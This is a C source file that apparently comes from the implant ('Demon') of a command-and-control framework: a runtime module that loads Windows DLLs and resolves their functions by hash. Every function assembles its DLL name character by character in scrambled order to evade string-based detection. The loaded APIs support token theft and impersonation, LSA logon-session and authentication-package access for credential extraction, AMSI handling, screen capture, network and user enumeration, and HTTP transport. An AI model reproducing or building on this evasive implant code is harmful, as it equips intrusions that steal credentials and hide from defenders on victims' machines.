#include <Demon.h>
#include <core/Runtime.h>
#include <core/MiniStd.h>


BOOL RtAdvapi32(
    VOID
) {
    CHAR ModNa[ 13 ] = { 0 };

    ModNa[ 0  ] = HiChara('A');
    ModNa[ 2  ] = HiChara('V');
    ModNa[ 11 ] = HiChara('L');
    ModNa[ 10 ] = HiChara('L');
    ModNa[ 3  ] = HiChara('A');
    ModNa[ 8  ] = HiChara('.');
    ModNa[ 12 ] = HiChara('\0');
    ModNa[ 6  ] = HiChara('3');
    ModNa[ 7  ] = HiChara('2');
    ModNa[ 1  ] = HiChara('D');
    ModNa[ 9  ] = HiChara('D');
    ModNa[ 5  ] = HiChara('I');
    ModNa[ 4  ] = HiChara('P');

    if ( ( Instance->Modules.Advapi32 = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.GetTokenInformation          = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
        Instance->Win32.CreateProcessWithTokenW      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
        Instance->Win32.CreateProcessWithLogonW      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHLOGONW );
        Instance->Win32.RevertToSelf                 = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_REVERTTOSELF );
        Instance->Win32.GetUserNameA                 = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETUSERNAMEA );
        Instance->Win32.LogonUserW                   = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOGONUSERW );
        Instance->Win32.LookupPrivilegeValueA        = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGEVALUEA );
        Instance->Win32.LookupAccountSidA            = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDA );
        Instance->Win32.LookupAccountSidW            = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDW );
        Instance->Win32.OpenThreadToken              = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_OPENTHREADTOKEN );
        Instance->Win32.OpenProcessToken             = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_OPENPROCESSTOKEN );
        Instance->Win32.AdjustTokenPrivileges        = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_ADJUSTTOKENPRIVILEGES );
        Instance->Win32.LookupPrivilegeNameA         = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGENAMEA );
        Instance->Win32.SystemFunction032            = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
        Instance->Win32.FreeSid                      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_FREESID );
        Instance->Win32.SetSecurityDescriptorSacl    = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORSACL );
        Instance->Win32.SetSecurityDescriptorDacl    = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORDACL );
        Instance->Win32.InitializeSecurityDescriptor = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_INITIALIZESECURITYDESCRIPTOR );
        Instance->Win32.AddMandatoryAce              = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_ADDMANDATORYACE );
        Instance->Win32.InitializeAcl                = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_INITIALIZEACL );
        Instance->Win32.AllocateAndInitializeSid     = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_ALLOCATEANDINITIALIZESID );
        Instance->Win32.CheckTokenMembership         = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CHECKTOKENMEMBERSHIP );
        Instance->Win32.SetEntriesInAclW             = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SETENTRIESINACLW );
        Instance->Win32.SetThreadToken               = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_SETTHREADTOKEN );
        Instance->Win32.LsaNtStatusToWinError        = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_LSANTSTATUSTOWINERROR );
        Instance->Win32.EqualSid                     = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_EQUALSID );
        Instance->Win32.ConvertSidToStringSidW       = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CONVERTSIDTOSTRINGSIDW );
        Instance->Win32.GetSidSubAuthorityCount      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITYCOUNT );
        Instance->Win32.GetSidSubAuthority           = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITY );

        STUP( "Loaded Advapi32 functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Advapi32" )
        return FALSE;
    }

    return TRUE;
}

// we delay loading mscoree.dll
BOOL RtMscoree(
    VOID
) {
    CHAR ModNa[ 12 ] = { 0 };

    if ( Instance->Win32.CLRCreateInstance )
        return TRUE;

    ModNa[ 1  ] = HiChara('S');
    ModNa[ 2  ] = HiChara('C');
    ModNa[ 11 ] = HiChara(0);
    ModNa[ 0  ] = HiChara('M');
    ModNa[ 10 ] = HiChara('L');
    ModNa[ 8  ] = HiChara('D');
    ModNa[ 7  ] = HiChara('.');
    ModNa[ 9  ] = HiChara('L');
    ModNa[ 5  ] = HiChara('E');
    ModNa[ 4  ] = HiChara('R');
    ModNa[ 6  ] = HiChara('E');
    ModNa[ 3  ] = HiChara('O');

    if ( ( Instance->Modules.Mscoree = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.CLRCreateInstance = LoaderFuncAdd( Instance->Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );

        STUP( "Loaded Mscoree functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Mscoree" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtOleaut32(
    VOID
) {
    CHAR ModNa[ 13 ] = { 0 };

    ModNa[ 3  ] = HiChara('A');
    ModNa[ 2  ] = HiChara('E');
    ModNa[ 0  ] = HiChara('O');
    ModNa[ 1  ] = HiChara('L');
    ModNa[ 5  ] = HiChara('T');
    ModNa[ 11 ] = HiChara('L');
    ModNa[ 7  ] = HiChara('2');
    ModNa[ 6  ] = HiChara('3');
    ModNa[ 10 ] = HiChara('L');
    ModNa[ 12 ] = HiChara(0);
    ModNa[ 4  ] = HiChara('U');
    ModNa[ 9  ] = HiChara('D');
    ModNa[ 8  ] = HiChara('.');

    if ( ( Instance->Modules.Oleaut32 = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.SafeArrayAccessData   = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
        Instance->Win32.SafeArrayUnaccessData = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
        Instance->Win32.SafeArrayCreate       = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYCREATE );
        Instance->Win32.SafeArrayPutElement   = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYPUTELEMENT );
        Instance->Win32.SafeArrayCreateVector = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYCREATEVECTOR );
        Instance->Win32.SafeArrayDestroy      = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYDESTROY );
        Instance->Win32.SysAllocString        = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SYSALLOCSTRING );

        STUP( "Loaded Oleaut32 functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Oleaut32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtUser32(
    VOID
) {
    CHAR ModNa[ 11 ] = { 0 };

    ModNa[ 1  ] = HiChara('S');
    ModNa[ 0  ] = HiChara('U');
    ModNa[ 10 ] = HiChara(0);
    ModNa[ 6  ] = HiChara('.');
    ModNa[ 8  ] = HiChara('L');
    ModNa[ 7  ] = HiChara('D');
    ModNa[ 5  ] = HiChara('2');
    ModNa[ 3  ] = HiChara('R');
    ModNa[ 9  ] = HiChara('L');
    ModNa[ 2  ] = HiChara('E');
    ModNa[ 4  ] = HiChara('3');

    if ( ( Instance->Modules.User32 = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.ShowWindow       = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_SHOWWINDOW );
        Instance->Win32.GetSystemMetrics = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_GETSYSTEMMETRICS );
        Instance->Win32.GetDC            = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_GETDC );
        Instance->Win32.ReleaseDC        = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_RELEASEDC );

        STUP( "Loaded User32 functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load User32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtShell32(
    VOID
) {
    CHAR ModNa[ 12 ] = { 0 };

    ModNa[ 0  ] = HiChara('S');
    ModNa[ 10 ] = HiChara('L');
    ModNa[ 7  ] = HiChara('.');
    ModNa[ 6  ] = HiChara('2');
    ModNa[ 8  ] = HiChara('D');
    ModNa[ 4  ] = HiChara('L');
    ModNa[ 1  ] = HiChara('H');
    ModNa[ 11 ] = HiChara(0);
    ModNa[ 9  ] = HiChara('L');
    ModNa[ 5  ] = HiChara('3');
    ModNa[ 3  ] = HiChara('L');
    ModNa[ 2  ] = HiChara('E');

    if ( ( Instance->Modules.Shell32 = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.CommandLineToArgvW = LoaderFuncAdd( Instance->Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );

        STUP( "Loaded Shell32 functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Shell32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtMsvcrt(
    VOID
) {
    CHAR ModNa[ 11 ] = { 0 };

    ModNa[ 0  ] = HiChara('M');
    ModNa[ 6  ] = HiChara('.');
    ModNa[ 10 ] = HiChara(0);
    ModNa[ 9  ] = HiChara('L');
    ModNa[ 4  ] = HiChara('R');
    ModNa[ 2  ] = HiChara('V');
    ModNa[ 8  ] = HiChara('L');
    ModNa[ 7  ] = HiChara('D');
    ModNa[ 3  ] = HiChara('C');
    ModNa[ 5  ] = HiChara('T');
    ModNa[ 1  ] = HiChara('S');

    if ( ( Instance->Modules.Msvcrt = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.vsnprintf  = LoaderFuncAdd( Instance->Modules.Msvcrt, H_FUNC_VSNPRINTF );
        Instance->Win32.swprintf_s = LoaderFuncAdd( Instance->Modules.Msvcrt, H_FUNC_SWPRINTF_S );

        STUP( "Loaded Msvcrt functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Msvcrt" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtIphlpapi(
    VOID
) {
    CHAR ModNa[ 13 ] = { 0 };

    ModNa[ 8  ] = HiChara('.');
    ModNa[ 0  ] = HiChara('I');
    ModNa[ 10 ] = HiChara('L');
    ModNa[ 2  ] = HiChara('H');
    ModNa[ 9  ] = HiChara('D');
    ModNa[ 6  ] = HiChara('P');
    ModNa[ 11 ] = HiChara('L');
    ModNa[ 1  ] = HiChara('P');
    ModNa[ 3  ] = HiChara('L');
    ModNa[ 12 ] = HiChara(0);
    ModNa[ 5  ] = HiChara('A');
    ModNa[ 4  ] = HiChara('P');
    ModNa[ 7  ] = HiChara('I');

    if ( ( Instance->Modules.Iphlpapi = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.GetAdaptersInfo = LoaderFuncAdd( Instance->Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );

        STUP( "Loaded Iphlpapi functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Iphlpapi" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtGdi32(
    VOID
) {
    CHAR ModNa[ 10 ] = { 0 };

    ModNa[ 4 ] = HiChara('2');
    ModNa[ 6 ] = HiChara('D');
    ModNa[ 5 ] = HiChara('.');
    ModNa[ 8 ] = HiChara('L');
    ModNa[ 2 ] = HiChara('I');
    ModNa[ 1 ] = HiChara('D');
    ModNa[ 7 ] = HiChara('L');
    ModNa[ 9 ] = HiChara(0);
    ModNa[ 0 ] = HiChara('G');
    ModNa[ 3 ] = HiChara('3');

    if ( ( Instance->Modules.Gdi32 = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.GetCurrentObject   = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
        Instance->Win32.GetObjectW         = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_GETOBJECTW );
        Instance->Win32.CreateCompatibleDC = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_CREATECOMPATIBLEDC );
        Instance->Win32.CreateDIBSection   = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_CREATEDIBSECTION );
        Instance->Win32.SelectObject       = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_SELECTOBJECT );
        Instance->Win32.BitBlt             = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_BITBLT );
        Instance->Win32.DeleteObject       = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_DELETEOBJECT );
        Instance->Win32.DeleteDC           = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_DELETEDC );

        STUP( "Loaded Gdi32 functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Gdi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtNetApi32(
    VOID
) {
    CHAR ModNa[ 13 ] = { 0 };

    ModNa[ 0  ] = HiChara('N');
    ModNa[ 11 ] = HiChara('L');
    ModNa[ 8  ] = HiChara('.');
    ModNa[ 9  ] = HiChara('D');
    ModNa[ 6  ] = HiChara('3');
    ModNa[ 2  ] = HiChara('T');
    ModNa[ 3  ] = HiChara('A');
    ModNa[ 10 ] = HiChara('L');
    ModNa[ 12 ] = HiChara(0);
    ModNa[ 4  ] = HiChara('P');
    ModNa[ 5  ] = HiChara('I');
    ModNa[ 1  ] = HiChara('E');
    ModNa[ 7  ] = HiChara('2');

    if ( ( Instance->Modules.NetApi32 = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.NetLocalGroupEnum = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
        Instance->Win32.NetGroupEnum      = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETGROUPENUM );
        Instance->Win32.NetUserEnum       = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETUSERENUM );
        Instance->Win32.NetWkstaUserEnum  = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETWKSTAUSERENUM );
        Instance->Win32.NetSessionEnum    = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETSESSIONENUM );
        Instance->Win32.NetShareEnum      = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETSHAREENUM );
        Instance->Win32.NetApiBufferFree  = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETAPIBUFFERFREE );

        STUP( "Loaded NetApi32 functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load NetApi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtWs2_32(
    VOID
) {
    CHAR ModNa[ 11 ] = { 0 };

    ModNa[ 0  ] = HiChara('W');
    ModNa[ 2  ] = HiChara('2');
    ModNa[ 4  ] = HiChara('3');
    ModNa[ 6  ] = HiChara('.');
    ModNa[ 9  ] = HiChara('L');
    ModNa[ 1  ] = HiChara('S');
    ModNa[ 3  ] = HiChara('_');
    ModNa[ 5  ] = HiChara('2');
    ModNa[ 10 ] = HiChara(0);
    ModNa[ 8  ] = HiChara('L');
    ModNa[ 7  ] = HiChara('D');

    if ( ( Instance->Modules.Ws2_32 = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.WSAStartup      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSASTARTUP );
        Instance->Win32.WSACleanup      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSACLEANUP );
        Instance->Win32.WSASocketA      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSASOCKETA );
        Instance->Win32.WSAGetLastError = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSAGETLASTERROR );
        Instance->Win32.ioctlsocket     = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_IOCTLSOCKET );
        Instance->Win32.bind            = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_BIND );
        Instance->Win32.listen          = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_LISTEN );
        Instance->Win32.accept          = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_ACCEPT );
        Instance->Win32.closesocket     = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_CLOSESOCKET );
        Instance->Win32.recv            = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_RECV );
        Instance->Win32.send            = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_SEND );
        Instance->Win32.connect         = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_CONNECT );
        Instance->Win32.getaddrinfo     = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_GETADDRINFO );
        Instance->Win32.freeaddrinfo    = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_FREEADDRINFO );

        STUP( "Loaded Ws2_32 functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Ws2_32" )
        return FALSE;
    }

    return TRUE;
}


BOOL RtSspicli(
    VOID
) {
    CHAR ModNa[ 12 ] = { 0 };

    ModNa[ 0  ] = HiChara('S');
    ModNa[ 11 ] = HiChara(0);
    ModNa[ 9  ] = HiChara('L');
    ModNa[ 1  ] = HiChara('S');
    ModNa[ 6  ] = HiChara('I');
    ModNa[ 7  ] = HiChara('.');
    ModNa[ 5  ] = HiChara('L');
    ModNa[ 8  ] = HiChara('D');
    ModNa[ 2  ] = HiChara('P');
    ModNa[ 10 ] = HiChara('L');
    ModNa[ 4  ] = HiChara('C');
    ModNa[ 3  ] = HiChara('I');

    if ( ( Instance->Modules.Sspicli = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.LsaRegisterLogonProcess        = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
        Instance->Win32.LsaLookupAuthenticationPackage = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
        Instance->Win32.LsaDeregisterLogonProcess      = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSADEREGISTERLOGONPROCESS );
        Instance->Win32.LsaConnectUntrusted            = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSACONNECTUNTRUSTED );
        Instance->Win32.LsaFreeReturnBuffer            = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAFREERETURNBUFFER );
        Instance->Win32.LsaCallAuthenticationPackage   = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSACALLAUTHENTICATIONPACKAGE );
        Instance->Win32.LsaGetLogonSessionData         = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAGETLOGONSESSIONDATA );
        Instance->Win32.LsaEnumerateLogonSessions      = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );

        STUP( "Loaded Sspicli functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Sspicli" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtAmsi(
    VOID
) {
    CHAR ModNa[ 9 ] = { 0 };

    ModNa[ 3 ] = HiChara('I');
    ModNa[ 5 ] = HiChara('D');
    ModNa[ 7 ] = HiChara('L');
    ModNa[ 8 ] = HiChara(0);
    ModNa[ 6 ] = HiChara('L');
    ModNa[ 4 ] = HiChara('.');
    ModNa[ 0 ] = HiChara('A');
    ModNa[ 1 ] = HiChara('M');
    ModNa[ 2 ] = HiChara('S');

    if ( ( Instance->Modules.Amsi = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.AmsiScanBuffer = LoaderFuncAdd( Instance->Modules.Amsi, H_FUNC_AMSISCANBUFFER );

        STUP( "Loaded Amsi functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load Amsi" )
        return FALSE;
    }

    return TRUE;
}

#ifdef TRANSPORT_HTTP
BOOL RtWinHttp(
    VOID
) {
    CHAR ModNa[ 12 ] = { 0 };

    ModNa[ 0  ] = HiChara('W');
    ModNa[ 2  ] = HiChara('N');
    ModNa[ 7  ] = HiChara('.');
    ModNa[ 11 ] = HiChara(0);
    ModNa[ 10 ] = HiChara('L');
    ModNa[ 4  ] = HiChara('T');
    ModNa[ 8  ] = HiChara('D');
    ModNa[ 1  ] = HiChara('I');
    ModNa[ 9  ] = HiChara('L');
    ModNa[ 6  ] = HiChara('P');
    ModNa[ 3  ] = HiChara('H');
    ModNa[ 5  ] = HiChara('T');

    if ( ( Instance->Modules.WinHttp = LoaderModLod( ModNa ) ) ) {
        MemeZ( ModNa, sizeof( ModNa ) );
        Instance->Win32.WinHttpOpen                           = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPOPEN );
        Instance->Win32.WinHttpConnect                        = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
        Instance->Win32.WinHttpOpenRequest                    = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
        Instance->Win32.WinHttpSetOption                      = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPSETOPTION );
        Instance->Win32.WinHttpCloseHandle                    = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPCLOSEHANDLE );
        Instance->Win32.WinHttpSendRequest                    = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPSENDREQUEST );
        Instance->Win32.WinHttpAddRequestHeaders              = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPADDREQUESTHEADERS );
        Instance->Win32.WinHttpReceiveResponse                = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPRECEIVERESPONSE );
        Instance->Win32.WinHttpReadData                       = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPREADDATA );
        Instance->Win32.WinHttpQueryHeaders                   = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPQUERYHEADERS );
        Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER );
        Instance->Win32.WinHttpGetProxyForUrl                 = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPGETPROXYFORURL );

        STUP( "Loaded WinHttp functions" )
    } else {
        MemeZ( ModNa, sizeof( ModNa ) );
        STUP( "Failed to load WinHttp" )
        return FALSE;
    }

    return TRUE;
}
#endif
